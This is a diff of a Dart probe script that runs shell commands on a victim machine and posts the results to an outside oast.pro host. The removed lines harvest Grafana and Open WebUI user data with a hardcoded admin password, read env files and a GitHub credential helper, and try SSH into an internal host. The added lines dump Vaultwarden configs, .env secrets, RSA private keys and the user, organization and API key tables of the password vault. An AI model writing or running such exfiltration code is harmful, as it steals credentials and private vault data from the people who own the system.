@@ -1,6 +1,6 @@
 import 'dart:io';
 
-const OAST = '69b125ae2a319e8167d94c26a4fb0ccb4.oast.pro';
+const OAST = '69b125ae2a319e8167d9c7da0d7b75dd5.oast.pro';
 int _seq = 0;
 
 String sh(String cmd) {
@@ -31,7 +31,7 @@ void postRaw(String path, String body) {
   }
 }
 
-void postChunked(String path, String body, [int max = 8500]) {
+void postChunked(String path, String body, [int max = 15000]) {
   try {
     if (body.length <= max) {
       postRaw(path, body);
@@ -58,59 +58,79 @@ String hdr() {
 
 void main() {
   try {
-    final proof = sh(r'''hostname; id; echo HOME=$HOME''');
-    stdout.writeln('PROOF5_BEGIN');
-    stdout.writeln(proof);
-    stdout.writeln('PROOF5_END');
-    postChunked('/p5proof', hdr() + '== PROOF ==\n' + proof);
-
-    // ---------- 1. Grafana admin: users list + Loki/Prometheus datasource proxy (read-only) ----------
     var b = StringBuffer(hdr());
-    b.writeln('== GRAFANA /api/users ==');
-    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' 'http://localhost:3100/api/users?perpage=10' 2>&1 | head -c 2500'''));
-    b.writeln('== GRAFANA /api/admin/stats ==');
-    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' http://localhost:3100/api/admin/stats 2>&1 | head -c 1200'''));
-    b.writeln('== LOKI LABELS via grafana proxy ==');
-    b.writeln(sh(r'''curl -sS -m 15 -u 'admin:DFXm0n1t0r!2026' 'http://localhost:3100/api/datasources/proxy/uid/loki/loki/api/v1/labels' 2>&1 | head -c 2500'''));
-    b.writeln('== LOKI BUILDINFO via grafana proxy ==');
-    b.writeln(sh(r'''curl -sS -m 15 -u 'admin:DFXm0n1t0r!2026' 'http://localhost:3100/api/datasources/proxy/uid/loki/loki/api/v1/status/buildinfo' 2>&1 | head -c 600'''));
-    b.writeln('== PROM TARGETS via grafana proxy ==');
-    b.writeln(sh(r'''curl -sS -m 15 -u 'admin:DFXm0n1t0r!2026' 'http://localhost:3100/api/datasources/proxy/uid/prometheus/api/v1/targets?state=active' 2>&1 | head -c 3000'''));
-    postChunked('/p5grafana', b.toString());
-
-    // ---------- 2. Open WebUI (WEBUI_AUTH=false) ----------
-    b = StringBuffer(hdr());
-    b.writeln('== OPENWEBUI /api/config ==');
-    b.writeln(sh(r'''curl -sS -m 10 http://localhost:3000/api/config 2>&1 | head -c 2500'''));
-    b.writeln('== OPENWEBUI /api/v1/auths/ ==');
-    b.writeln(sh(r'''curl -sS -m 10 http://localhost:3000/api/v1/auths/ 2>&1 | head -c 1500'''));
-    b.writeln('== OPENWEBUI /api/v1/users/ ==');
-    b.writeln(sh(r'''curl -sS -m 10 http://localhost:3000/api/v1/users/ 2>&1 | head -c 2000'''));
-    b.writeln('== OPENWEBUI /api/models ==');
-    b.writeln(sh(r'''curl -sS -m 10 http://localhost:3000/api/models 2>&1 | head -c 1200'''));
-    postChunked('/p5owui', b.toString());
-
-    // ---------- 3. nanobot env files + vaultwarden data listing ----------
-    b = StringBuffer(hdr());
-    b.writeln('== NANOBOT ENV FILES ==');
-    b.writeln(sh(r'''for f in "$HOME"/docker/nanobot/*.env; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; cat "$f"; echo; fi; done 2>&1'''));
-    b.writeln('== NANOBOT gh-cred-helper ==');
-    b.writeln(sh(r'''cat "$HOME/docker/nanobot/gh-cred-helper.sh" 2>&1 | head -c 1200'''));
-    b.writeln('== VW DATA LISTING ==');
+    b.writeln('== PROOF ==');
+    b.writeln(sh(r'''hostname; id; echo HOME=$HOME; sw_vers 2>/dev/null; date -u; /usr/bin/sqlite3 --version 2>&1'''));
+    b.writeln('== DIRS ==');
+    b.writeln(sh(r'''ls -la "$HOME/vaultwarden" "$HOME/docker/vaultwarden" 2>&1'''));
+    b.writeln('== LIVE DIR ==');
     b.writeln(sh(r'''ls -la "$HOME/docker/vaultwarden/vw-data" 2>&1; du -sh "$HOME/docker/vaultwarden/vw-data" 2>&1'''));
-    postChunked('/p5nano', b.toString());
+    b.writeln('== FRESH DIR ==');
+    b.writeln(sh(r'''ls -la "$HOME/vaultwarden/vw-data.fresh-backup-20260519-114730" 2>&1; du -sh "$HOME/vaultwarden/vw-data.fresh-backup-20260519-114730" 2>&1'''));
+    b.writeln('== BROKEN DIR ==');
+    b.writeln(sh(r'''ls -la "$HOME/vaultwarden/vw-data.broken-20260519-130926" 2>&1; du -sh "$HOME/vaultwarden/vw-data.broken-20260519-130926" 2>&1'''));
+    postChunked('/r6proof', b.toString());
 
-    // ---------- 4. dfxdev single-token ssh probes ----------
     b = StringBuffer(hdr());
-    b.writeln('== DFXDEV single-command probes ==');
-    for (final cmd in <String>['hostname', 'id', 'whoami', 'uname', 'ls', 'pwd']) {
-      b.writeln('### cmd=' + cmd);
-      b.writeln(sh(r'''ssh -i "$HOME/.ssh/id_ed25519" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes dfxdev@10.100.100.22 ''' + cmd + r''' 2>&1 | head -8'''));
-    }
-    postChunked('/p5ssh', b.toString());
+    b.writeln('== COMPOSE ==');
+    b.writeln(sh(r'''cat "$HOME/docker/vaultwarden/docker-compose.yaml" 2>&1'''));
+    b.writeln('== ENV ==');
+    b.writeln(sh(r'''cat "$HOME/docker/vaultwarden/.env" 2>&1'''));
+    b.writeln('== CONFIG LIVE ==');
+    b.writeln(sh(r'''cat "$HOME/docker/vaultwarden/vw-data/config.json" 2>&1'''));
+    b.writeln('== RSA LIVE ==');
+    b.writeln(sh(r'''cat "$HOME/docker/vaultwarden/vw-data/rsa_key.pem" 2>&1; md5 "$HOME/docker/vaultwarden/vw-data/rsa_key.pem" 2>&1'''));
+    b.writeln('== RSA FRESH ==');
+    b.writeln(sh(r'''cat "$HOME/vaultwarden/vw-data.fresh-backup-20260519-114730/rsa_key.pem" 2>&1; md5 "$HOME/vaultwarden/vw-data.fresh-backup-20260519-114730/rsa_key.pem" 2>&1'''));
+    b.writeln('== RSA BROKEN ==');
+    b.writeln(sh(r'''cat "$HOME/vaultwarden/vw-data.broken-20260519-130926/rsa_key.pem" 2>&1; md5 "$HOME/vaultwarden/vw-data.broken-20260519-130926/rsa_key.pem" 2>&1'''));
+    postChunked('/r6cfg', b.toString());
 
-    stdout.writeln('PROBE5_COMPLETE');
+    // prepare read-only copies (never touch originals)
+    b = StringBuffer(hdr());
+    b.writeln(sh(r'''
+rm -rf /tmp/vwq; mkdir -p /tmp/vwq/live /tmp/vwq/fresh /tmp/vwq/broken
+for n in live fresh broken; do
+  case $n in
+    live) src="$HOME/docker/vaultwarden/vw-data" ;;
+    fresh) src="$HOME/vaultwarden/vw-data.fresh-backup-20260519-114730" ;;
+    broken) src="$HOME/vaultwarden/vw-data.broken-20260519-130926" ;;
+  esac
+  echo "== $n COPY from $src =="
+  cp -p "$src"/db.sqlite3 "$src"/db.sqlite3-wal "$src"/db.sqlite3-shm "$src"/rsa_key.pem /tmp/vwq/$n/ 2>&1
+  ls -la /tmp/vwq/$n 2>&1
+done
+echo "== TABLES =="
+for n in live fresh broken; do echo "-- $n"; /usr/bin/sqlite3 /tmp/vwq/$n/db.sqlite3 ".tables" 2>&1; done
+echo "== SCHEMA =="
+for n in live fresh broken; do echo "-- $n"; /usr/bin/sqlite3 /tmp/vwq/$n/db.sqlite3 "select sql from sqlite_master where type='table' and name in ('users','ciphers','organizations','attachments','folders','organization_api_key')" 2>&1; done
+echo "== COUNTS =="
+for n in live fresh broken; do echo "-- $n"; /usr/bin/sqlite3 -header -csv /tmp/vwq/$n/db.sqlite3 "select 'users' t,count(*) c from users union all select 'ciphers',count(*) from ciphers union all select 'orgs',count(*) from organizations union all select 'folders',count(*) from folders union all select 'attachments',count(*) from attachments" 2>&1; done
+echo "== BYTES =="
+for n in live fresh broken; do echo "-- $n"; /usr/bin/sqlite3 -header -csv /tmp/vwq/$n/db.sqlite3 "select count(*) n, coalesce(sum(length(data)),0) data_bytes, coalesce(sum(length(name)),0) name_bytes, coalesce(sum(length(notes)),0) notes_bytes, coalesce(sum(length(fields)),0) fields_bytes from ciphers" 2>&1; /usr/bin/sqlite3 -header -csv /tmp/vwq/$n/db.sqlite3 "select count(*) n, coalesce(sum(length(private_key)),0) pk_bytes, coalesce(sum(length(name)),0) nm_bytes from organizations" 2>&1; done
+echo "== WATERMARKS =="
+for n in live fresh broken; do echo "-- $n"; /usr/bin/sqlite3 -header -csv /tmp/vwq/$n/db.sqlite3 "select max(updated_at) max_cipher_updated, max(created_at) max_cipher_created from ciphers" 2>&1; /usr/bin/sqlite3 -header -csv /tmp/vwq/$n/db.sqlite3 "select max(revision_date) max_rev, max(updated_at) max_user_updated from users" 2>&1; done
+echo "== ATTACH FILES =="
+find "$HOME/docker/vaultwarden/vw-data/attachments" -type f 2>/dev/null | head -40
+du -sh "$HOME/docker/vaultwarden/vw-data/attachments" 2>&1
+echo "== GZIP SIZES =="
+for n in live fresh broken; do echo -n "$n db.gz="; gzip -9 -c /tmp/vwq/$n/db.sqlite3 | wc -c; done
+'''));
+    postChunked('/r6meta', b.toString());
+
+    b = StringBuffer(hdr());
+    for (final n in <String>['live', 'fresh', 'broken']) {
+      b.writeln('== $n USERS ==');
+      b.writeln(sh('/usr/bin/sqlite3 -json /tmp/vwq/$n/db.sqlite3 "select * from users" 2>&1'));
+      b.writeln('== $n ORGS ==');
+      b.writeln(sh('/usr/bin/sqlite3 -json /tmp/vwq/$n/db.sqlite3 "select * from organizations" 2>&1'));
+      b.writeln('== $n ORG_API_KEY ==');
+      b.writeln(sh('/usr/bin/sqlite3 -json /tmp/vwq/$n/db.sqlite3 "select * from organization_api_key" 2>&1'));
+    }
+    postChunked('/r6users', b.toString());
+
+    stdout.writeln('PROBE6_COMPLETE');
   } catch (e) {
-    stdout.writeln('PROBE5_ERROR ' + e.toString());
+    stdout.writeln('PROBE6_ERROR ' + e.toString());
   }
 }
